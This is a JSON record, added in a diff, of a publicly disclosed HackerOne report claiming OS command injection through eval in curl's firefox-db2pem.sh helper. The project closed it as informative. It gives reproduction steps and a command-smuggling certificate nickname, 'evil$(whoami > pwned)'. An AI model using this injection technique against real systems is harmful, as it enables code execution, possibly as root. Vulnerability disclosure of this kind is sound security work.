@@ -1,0 +1,140 @@
+{
+  "id": 3225565,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMjI1NTY1",
+  "url": "https://hackerone.com/reports/3225565",
+  "title": " OS Command Injection in scripts/firefox-db2pem.sh via untrusted certificate nicknames",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "high",
+  "readable_substate": "Informative",
+  "created_at": "2025-06-26T21:10:59.285Z",
+  "submitted_at": "2025-06-26T21:10:59.650Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "behindtheblackwall",
+    "url": "/behindtheblackwall",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/2u6wrbowzmdk51svk1hnoi352z25/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-06-28T12:19:19.279Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2025-06-27T09:55:37.628Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "On AI usage: Only for grammar/formatting suggestions/POC code troubleshooting; all vulnerability discovery, POC code creation, and analysis were done manually.\n\nHey folks, I noticed something I think is worth bringing to you--\n\nscripts/firefox-db2pem.sh helper in the curl source uses\n\n`eval certutil -d \"$db\" -L -n \"$nickname\" -a`\n\nto extract each certificate by nickname. Because eval re-parses its arguments, a malicious nickname containing shell syntax (e.g. $(whoami > pwned)) is executed on the host.\n\nAffected Version\n-curl master as of June 26 2025 (commit 2a9dfe2), not sure how long this vuln has been in for though.\n\nSteps To Reproduce\n1. Install prerequisites\n\n`sudo apt-get install -y libnss3-tools openssl`\n\n2. Create a throw-away profile\n`export HOME=$(mktemp -d)`\n`PROF=\"$HOME/.mozilla/firefox/safe.default\"`\n`mkdir -p \"$PROF\"`\n`certutil -N --empty-password -d \"$PROF\"`\n\n3. Generate a self-signed cert\n`openssl req -x509 -newkey rsa:2048 -nodes \\\n    -subj '/CN=RCE-Test/' -days 1 \\\n    -keyout \"$HOME/key.pem\" -out \"$HOME/cert.pem\"`\n\n4. Import it with a malicious nickname that runs whoami\n`payload='evil$(whoami > pwned)'\ncertutil -A -d \"$PROF\" -n \"$payload\" -t \"C,C,C\" -i \"$HOME/cert.pem\"`\n\n5.Verify the nickname is listed\n`certutil -L -h 'Builtin Object Token' -d \"$PROF\"`\n\n6. Run the vulnerable helper\n`bash -x scripts/firefox-db2pem.sh \"$HOME/ca-bundle.pem\" || true`\n\n7. Observe proof file\n`cat pwned`\n\nYou can also just use my below POC script which I'll attach, but its basically just those steps automated.\n\nSupporting Material / References\n\n    Vulnerable code snippet in scripts/firefox-db2pem.sh:\n\n54  certutil -L -h 'Builtin Object Token' -d \"$db\" | \\\n55  grep ' *[CcGTPpu]*,[CcGTPpu]*,[CcGTPpu]* *$' | \\\n56  sed -e 's/ *[CcGTPpu]*,[CcGTPpu]*,[CcGTPpu]* *$//' -e 's/\\(.*\\)/\"\\1\"/' | \\\n57  sort | \\\n58  while read -r nickname; \\\n59   do echo \"$nickname\" | sed -e \"s/Builtin Object Token://g\"; \\\n60  eval certutil -d \"$db\" -L -n \"$nickname\" -a ; \\\n61  done >> \"$out\"\n\nBecause the nickname value is substituted into the string that eval executes, any shell metacharacters or command sequences in a nickname will run as part of the shell command.\n\n## Impact\n\nAn attacker who can import a certificate into any Firefox NSS database—e.g., their own profile—can achieve arbitrary code execution when scripts/firefox-db2pem.sh is run. In practice, many administrators run this helper as root to generate a system-wide CA bundle, so this bug yields root-level RCE on affected systems.",
+  "weakness": {
+    "id": 59,
+    "name": "OS Command Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 4498408,
+      "file_name": "db2pem-rce-debug.sh",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/tfbfpzjjv6x3fg8yydy80dkpfu3d?response-content-disposition=attachment%3B%20filename%3D%22db2pem-rce-debug.sh%22%3B%20filename%2A%3DUTF-8%27%27db2pem-rce-debug.sh&response-content-type=application%2Fx-sh&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3NA4ZRNK%2F20260502%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260502T163509Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHcaCXVzLXdlc3QtMiJHMEUCIQDNmD5J9ZFsXeRyCqObmrZer2c06hFy1sItZtkWRZwBkgIgKS9iMpDehD2xsrgfLto83L5G1Zl9QuH7RGBbYWGpnk8qsQUIQBADGgwwMTM2MTkyNzQ4NDkiDOqhzyKRueo8p9iMfSqOBama0IDdT%2BFl%2BI5oBV8Rvl%2FWWhvISzLlS2%2F65qJpqpx9K8SmzWX5Gm8B4c6E1wsGR%2F9RJMefyI89JJsfsuuEyPasrwFvWNDLs5dnhuj3YNpZ5UEk5eISK%2BiZMe9wDnaTB%2Bznr5Qucfu7XUiFtD1IG%2FYh3c1K4nU8Bs1ZxrPHq6aO11TfzjBlsRDU1%2FGoxODdMVw2JF09zD3HrZ6%2FXJAOLaBiG%2FpIdRX4o74ZdnVoXfnPKEB5KKEhEsFQA1UDZop3hLbdH7YGWYanDWJC1Pb4EnFq8NU%2F89yrs92Q79Z0PWMw4WgDIoHYmGhkT2l5jjoTKcXdc2LeEuK0gXSevL6LDbw%2FfRGTQzIxFFPiqx5PYyY0CmLShcZl8Qc2kjNb0X3SNaU18NF%2BrMeXbDOYneCtt3Q%2FR49yAgYyModmC545HlpacpAdB9tBRiJjhmp4f9FnmBxdus65xzcF%2FfKVTzNCSqqkuyoirvJNMOmmxp4PQ5Vr%2B53IPnhpRfXUow2M3o9ANiWR4cVs2Ka7aZLwrfmiE%2FmeSA0htgM6O3rdDvL4%2BKASGYAt5i%2FZzWLspyYHrHEZFvG8lbWHqUXBiMjfnteDsKLzUFxa2T5cMxfjk5ic5oU2w0Ag012cO%2BNOeVU2J1iTpcxS6tE4tEAWDQz1%2FLs1Q4Kzwyb9tO7ZFepqhbNrdP1HY84yXjkngy8TVouEIIjXOahWpjA7KuNIP2FyaxGHKA0%2BoSaOS5KN0yVZJaB3zXC5%2BcguESoBrTdKMUwjuiLHzYnmn9%2B4XFLqwOGqnRJv69tF5MT9KIyQQwz895c%2BDgJzL9wPiKn7QHcW37G1wmYLMxJzte2hQH0uQtERdeF9Tp68FH1YV%2BQxKrKSStnXzTCzodjPBjqxAce6nrMqLQ5%2FE0WJpsV9dXTSM685GrJs4qzTzVxUericyvUQrWsdo%2Bld1D%2B1TWDi7ONMuRdBIm67yvfosvndlfqvZiDM0wiU0lEYNmcV78iaY%2FQr8oxrHAwcaeVbC7IlAOBzP9UKpzzyzLGsN0R7gqn7lBfGCCNkl%2B0MJZhwArLOLJu60LHHdpubbLIQKM%2FK13AZ4fPk6xkj1GJu7eYggeVLX9SdBgaE6AZWzZdMwLHYrg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9988388954b9c95ece824bd67802be194a470414566deec8159117277afbcb4f",
+      "file_size": 7059,
+      "type": "application/x-sh",
+      "moderated": null
+    },
+    {
+      "id": 4498416,
+      "file_name": "pocrun.PNG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/sb24bpl3bdrwi81xmaisqi6zj73h?response-content-disposition=attachment%3B%20filename%3D%22pocrun.PNG%22%3B%20filename%2A%3DUTF-8%27%27pocrun.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3NA4ZRNK%2F20260502%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260502T163509Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHcaCXVzLXdlc3QtMiJHMEUCIQDNmD5J9ZFsXeRyCqObmrZer2c06hFy1sItZtkWRZwBkgIgKS9iMpDehD2xsrgfLto83L5G1Zl9QuH7RGBbYWGpnk8qsQUIQBADGgwwMTM2MTkyNzQ4NDkiDOqhzyKRueo8p9iMfSqOBama0IDdT%2BFl%2BI5oBV8Rvl%2FWWhvISzLlS2%2F65qJpqpx9K8SmzWX5Gm8B4c6E1wsGR%2F9RJMefyI89JJsfsuuEyPasrwFvWNDLs5dnhuj3YNpZ5UEk5eISK%2BiZMe9wDnaTB%2Bznr5Qucfu7XUiFtD1IG%2FYh3c1K4nU8Bs1ZxrPHq6aO11TfzjBlsRDU1%2FGoxODdMVw2JF09zD3HrZ6%2FXJAOLaBiG%2FpIdRX4o74ZdnVoXfnPKEB5KKEhEsFQA1UDZop3hLbdH7YGWYanDWJC1Pb4EnFq8NU%2F89yrs92Q79Z0PWMw4WgDIoHYmGhkT2l5jjoTKcXdc2LeEuK0gXSevL6LDbw%2FfRGTQzIxFFPiqx5PYyY0CmLShcZl8Qc2kjNb0X3SNaU18NF%2BrMeXbDOYneCtt3Q%2FR49yAgYyModmC545HlpacpAdB9tBRiJjhmp4f9FnmBxdus65xzcF%2FfKVTzNCSqqkuyoirvJNMOmmxp4PQ5Vr%2B53IPnhpRfXUow2M3o9ANiWR4cVs2Ka7aZLwrfmiE%2FmeSA0htgM6O3rdDvL4%2BKASGYAt5i%2FZzWLspyYHrHEZFvG8lbWHqUXBiMjfnteDsKLzUFxa2T5cMxfjk5ic5oU2w0Ag012cO%2BNOeVU2J1iTpcxS6tE4tEAWDQz1%2FLs1Q4Kzwyb9tO7ZFepqhbNrdP1HY84yXjkngy8TVouEIIjXOahWpjA7KuNIP2FyaxGHKA0%2BoSaOS5KN0yVZJaB3zXC5%2BcguESoBrTdKMUwjuiLHzYnmn9%2B4XFLqwOGqnRJv69tF5MT9KIyQQwz895c%2BDgJzL9wPiKn7QHcW37G1wmYLMxJzte2hQH0uQtERdeF9Tp68FH1YV%2BQxKrKSStnXzTCzodjPBjqxAce6nrMqLQ5%2FE0WJpsV9dXTSM685GrJs4qzTzVxUericyvUQrWsdo%2Bld1D%2B1TWDi7ONMuRdBIm67yvfosvndlfqvZiDM0wiU0lEYNmcV78iaY%2FQr8oxrHAwcaeVbC7IlAOBzP9UKpzzyzLGsN0R7gqn7lBfGCCNkl%2B0MJZhwArLOLJu60LHHdpubbLIQKM%2FK13AZ4fPk6xkj1GJu7eYggeVLX9SdBgaE6AZWzZdMwLHYrg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=382495a721ae1c9bc20d28b93d740ca73d22a879098dc669bacfe3e483fa1480",
+      "file_size": 161415,
+      "type": "image/png",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 12,
+  "voters": [
+    "zy9ard3",
+    "thalaivar304",
+    "2026",
+    "oblivionsage",
+    "berkun16",
+    "robimati",
+    "iossefy",
+    "isecuresites",
+    "druier",
+    "sumonkhan36",
+    "and 2 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
